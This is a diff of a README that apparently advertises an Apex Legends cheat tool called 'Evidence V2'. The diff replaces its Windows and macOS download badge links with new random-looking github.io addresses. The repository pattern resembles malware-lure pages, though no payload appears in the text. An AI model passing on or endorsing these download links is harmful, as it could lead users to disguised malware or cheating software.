@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_Evidence%20V2%20Apex%20Legends-F9A825?style=for-the-badge&logo=github)](https://wccorxpwogeu.github.io/setup-win2/)
+[![Download](https://img.shields.io/badge/Download_Evidence%20V2%20Apex%20Legends-F9A825?style=for-the-badge&logo=github)](https://iuoneuelxrhu.github.io/dl-windows2/)
 
 </div>
 
@@ -56,9 +56,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://wccorxpwogeu.github.io/setup-win2/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://iuoneuelxrhu.github.io/dl-windows2/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://wccorxpwogeu.github.io/install-mac2/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://iuoneuelxrhu.github.io/macos-setup2/)
 
 </div>
 
@@ -75,7 +75,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_Evidence%20V2%20Apex%20Legends-F9A825?style=for-the-badge&logo=github)](https://wccorxpwogeu.github.io/setup-win2/)
+[![Download](https://img.shields.io/badge/Download_Evidence%20V2%20Apex%20Legends-F9A825?style=for-the-badge&logo=github)](https://iuoneuelxrhu.github.io/dl-windows2/)
 
 </div>
 
